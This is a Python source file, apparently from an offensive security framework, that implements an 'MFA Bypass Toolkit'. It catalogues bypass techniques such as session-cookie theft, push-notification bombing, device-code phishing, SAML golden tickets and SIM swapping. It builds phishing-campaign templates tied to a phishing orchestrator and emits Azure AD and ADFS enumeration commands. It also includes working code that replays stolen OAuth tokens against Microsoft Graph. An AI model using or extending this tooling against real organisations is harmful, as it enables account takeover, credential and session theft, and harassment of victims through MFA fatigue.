"""MFA Bypass Toolkit — techniques for circumventing multi-factor authentication.

Provides automated and manual techniques for:
- Token theft and replay (session cookies, OAuth tokens, SAML assertions)
- MFA fatigue/push bombing automation
- Evilginx-style reverse proxy credential + token harvesting
- SAML/OAuth golden ticket attacks
- MFA enrollment abuse (enrolling attacker-controlled MFA device)
- Legacy protocol bypass (IMAP, POP3, SMTP with legacy auth)

Integrates with phishing_orchestrator.py for automated campaigns.
"""

from __future__ import annotations

import json
import os
from dataclasses import dataclass, field
from typing import Any

MFA_TECHNIQUES = {
    "session_steal": {
        "name": "Session Cookie Theft",
        "description": "Steal authenticated session cookies from browser data or via XSS",
        "target_protocols": ["SAML", "OAuth2", "OIDC", "CAS"],
        "tools": ["hack_browser_data", "dpapi_harvester", "cookie_editor"],
        "mitre": "T1539",
    },
    "token_replay": {
        "name": "OAuth Token Replay",
        "description": "Replay stolen OAuth2 access/refresh tokens before expiration",
        "target_protocols": ["OAuth2", "OIDC"],
        "tools": ["custom_script"],
        "mitre": "T1528",
    },
    "saml_golden": {
        "name": "SAML Golden Ticket",
        "description": "Forge SAML assertions using compromised ADFS token signing certificate",
        "target_protocols": ["SAML"],
        "tools": ["ADFSDump", "AADInternals"],
        "mitre": "T1606.002",
    },
    "mfa_bombing": {
        "name": "MFA Push Bombing / Fatigue",
        "description": "Send repeated MFA push notifications until victim accepts",
        "target_protocols": ["Push", "Duo", "Microsoft Authenticator"],
        "tools": ["custom_script", "phishing_orchestrator"],
        "mitre": "T1621",
    },
    "mfa_enrollment": {
        "name": "MFA Enrollment Abuse",
        "description": "Force MFA re-enrollment by provoking expired/missing device",
        "target_protocols": ["Microsoft Entra", "Okta"],
        "tools": ["social_engineering"],
        "mitre": "T1556",
    },
    "legacy_protocol": {
        "name": "Legacy Protocol Bypass",
        "description": "Use IMAP/POP3/SMTP with basic auth (MFA not enforced on legacy)",
        "target_protocols": ["IMAP", "POP3", "SMTP"],
        "tools": ["imap_login", "pop3_login"],
        "mitre": "T1110.001",
    },
    "evilginx_reverse": {
        "name": "Evilginx Reverse Proxy",
        "description": "Man-in-the-middle phishing proxy that captures session tokens",
        "target_protocols": ["SAML", "OAuth2", "OIDC"],
        "tools": ["evilginx2", "muraena", "modlishka"],
        "mitre": "T1566",
    },
    "device_code": {
        "name": "Device Code Phishing",
        "description": "Trick victim into entering device code on legitimate Microsoft login",
        "target_protocols": ["OAuth2 Device Code Flow"],
        "tools": ["TokenTactics", "AADInternals"],
        "mitre": "T1528",
    },
    "conditional_access": {
        "name": "Conditional Access Policy Enumeration",
        "description": "Enumerate MFA/CA policies to find gaps (no MFA for certain apps)",
        "target_protocols": ["Microsoft Graph API"],
        "tools": ["AADInternals", "GraphRunner"],
        "mitre": "T1082",
    },
    "sim_swap": {
        "name": "SIM Swap Attack",
        "description": "Social engineer mobile carrier to transfer victim's number to attacker SIM",
        "target_protocols": ["SMS", "Voice"],
        "tools": ["social_engineering", "OSINT"],
        "mitre": "T1598",
    },
    "adfs_trust": {
        "name": "ADFS Trust Relationship Abuse",
        "description": "Abuse ADFS trust to bypass MFA via federated identity",
        "target_protocols": ["SAML", "WS-Fed"],
        "tools": ["ADFSDump", "GoldenSAML"],
        "mitre": "T1606",
    },
}


@dataclass
class MFATarget:
    domain: str
    idp_url: str = ""
    idp_type: str = ""
    protocols: list[str] = field(default_factory=list)
    mfa_method: str = ""
    skip_mfa_urls: list[str] = field(default_factory=list)


@dataclass
class MFABypassResult:
    technique: str
    success: bool
    evidence: dict[str, Any] = field(default_factory=dict)
    tokens: list[str] = field(default_factory=list)
    cookies: list[str] = field(default_factory=list)


class MFABypassEngine:
    """MFA bypass planning and execution engine.

    Args:
        sessions_dir: Output directory for captured tokens and evidence.
    """

    def __init__(self, sessions_dir: str = "sessions"):
        self.sessions_dir = sessions_dir
        self.results: list[MFABypassResult] = []
        os.makedirs(sessions_dir, exist_ok=True)

    def enumerate_techniques(self, target: MFATarget) -> list[dict]:
        """Enumerate viable MFA bypass techniques for a given target.

        Args:
            target: MFATarget object with domain and IDP information.

        Returns:
            List of applicable technique dicts sorted by viability.
        """
        applicable = []
        for tech_id, tech in MFA_TECHNIQUES.items():
            if not target.protocols:
                applicable.append({"id": tech_id, **tech})
                continue
            if any(p.lower() in [tp.lower() for tp in tech["target_protocols"]] for p in target.protocols):
                applicable.append({"id": tech_id, **tech})

        applicable.sort(key=lambda t: len(set(t["target_protocols"]) & set(target.protocols or [])), reverse=True)
        return applicable

    def generate_phishing_templates(self, target: MFATarget) -> list[dict[str, str]]:
        """Generate phishing templates tailored for MFA bypass.

        Args:
            target: MFATarget with domain and IDP type.

        Returns:
            List of dicts with template_name and html_content keys.
        """
        templates = []

        if target.idp_type and "microsoft" in target.idp_type.lower():
            templates.append({
                "name": f"microsoft_device_code_{target.domain}",
                "type": "device_code",
                "description": "Instruct victim to visit aka.ms/devicelogin and enter the provided code. Attacker uses TokenTactics to obtain tokens.",
            })
            templates.append({
                "name": f"microsoft_mfa_fatigue_{target.domain}",
                "type": "mfa_bombing",
                "description": "After obtaining valid creds, repeatedly triggers MFA push. Configured for push bombing every 60s.",
            })

        if target.idp_type and "okta" in target.idp_type.lower():
            templates.append({
                "name": f"okta_session_theft_{target.domain}",
                "type": "session_steal",
                "description": "Target Okta session cookie. Use hack_browser_data or XSS to extract 'sid' cookie from <domain>.",
            })
            templates.append({
                "name": f"okta_fastpass_bypass_{target.domain}",
                "type": "legacy_protocol",
                "description": "Check if legacy auth endpoints are enabled: /api/v1/authn on <idp_url>.",
            })

        if any(p in (target.mfa_method or "").lower() for p in ("push", "duo", "authenticator")):
            templates.append({
                "name": f"push_bombing_{target.domain}",
                "type": "mfa_bombing",
                "description": f"Automated push bombing script targeting {target.mfa_method}. Attempts every 60s for 5 minutes. Use after password spray to trigger MFA push.",
            })

        templates.append({
            "name": f"conditional_access_enum_{target.domain}",
            "type": "conditional_access",
            "description": "Enumerate Conditional Access policies via Microsoft Graph / RoadTools / AADInternals to find applications without MFA requirement.",
        })

        templates.append({
            "name": f"legacy_auth_check_{target.domain}",
            "type": "legacy_protocol",
            "description": "Test IMAP (993), POP3 (995), SMTP (587) for legacy auth support. If MFA not enforced on legacy, basic auth bypasses MFA entirely.",
        })

        return templates

    def mfa_conditional_access_scan(self, domain: str) -> dict:
        """Scan for conditional access policy gaps.

        Returns commands to enumerate CA policies and identify
        applications excluded from MFA requirements.

        Args:
            domain: Target domain for Azure AD/Entra enumeration.

        Returns:
            Dict with scan commands and expected output indicators.
        """
        return {
            "domain": domain,
            "tools": {
                "roadrecon": f"roadrecon auth -u user@{domain} && roadrecon gather && roadrecon gui",
                "aadinternals": "Get-AADIntConditionalAccessPolicies | Where-Object {$_.State -eq 'enabled'} | Format-List DisplayName,IncludeApplications,ExcludeApplications,GrantControls",
                "graphrunner": "Import-Module GraphRunner; Invoke-GraphRecon -PermissionTest",
                "azurehound": f"azurehound list -u user@{domain} -p password az-tenants",
            },
            "indicators": [
                "ExcludeApplications — any app excluded from MFA",
                "GrantControls — 'Mfa' not present",
                "Legacy authentication allowed",
                "Trusted locations bypass MFA",
                "Named locations with public IPs",
            ],
        }

    def replay_oauth_token(self, access_token: str, refresh_token: str = "") -> dict:
        """Test if an OAuth2 token is still valid and can be replayed.

        Args:
            access_token: OAuth2 access token.
            refresh_token: Optional OAuth2 refresh token.

        Returns:
            Dict with validation results.
        """
        import requests as _requests  # noqa: F811
        graph_url = "https://graph.microsoft.com/v1.0/me"
        headers = {"Authorization": f"Bearer {access_token}"}
        result = {"valid": False, "scopes": [], "user": "", "error": ""}
        try:
            resp = _requests.get(graph_url, headers=headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                result["valid"] = True
                result["user"] = data.get("userPrincipalName", "")
                result["scopes"] = resp.headers.get("WWW-Authenticate", "")
        except Exception as e:
            result["error"] = str(e)
        return result

    def saml_golden_ticket_check(self, adfs_server: str) -> dict:
        """Check for ADFS token signing certificate exposure.

        Args:
            adfs_server: ADFS server hostname or IP.

        Returns:
            Dict with ADFS reconnaissance commands.
        """
        return {
            "adfs_server": adfs_server,
            "commands": [
                f"crackmapexec ldap {adfs_server} -u user -p pass -M adcs",
                f"Certipy-ad certipy find -u user -p pass -target {adfs_server}",
                "Get-ADFSProperties | Select-Object -ExpandProperty Certificate",
                "ADFSDump.exe /server:<adfs> /user:<user> /pass:<pass>",
            ],
            "indicators": [
                "Token-signing certificate accessible",
                "Encryption certificate accessible",
                "ADFS configuration exportable via LDAP",
                "Service account with DCSync rights",
            ],
        }

    def export_report(self) -> str:
        """Export MFA bypass results to a JSON report.

        Returns:
            Path to the report file.
        """
        report_path = os.path.join(self.sessions_dir, "mfa_bypass_report.json")
        report = {
            "techniques_enumerated": len(MFA_TECHNIQUES),
            "results": [],
        }
        for result in self.results:
            report["results"].append({
                "technique": result.technique,
                "success": result.success,
                "evidence": {
                    k: v for k, v in result.evidence.items()
                    if not any(s in str(v).lower() for s in ("password", "token:", "cookie:"))
                },
            })
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        return report_path


__all__ = ["MFABypassEngine", "MFATarget", "MFABypassResult", "MFA_TECHNIQUES"]
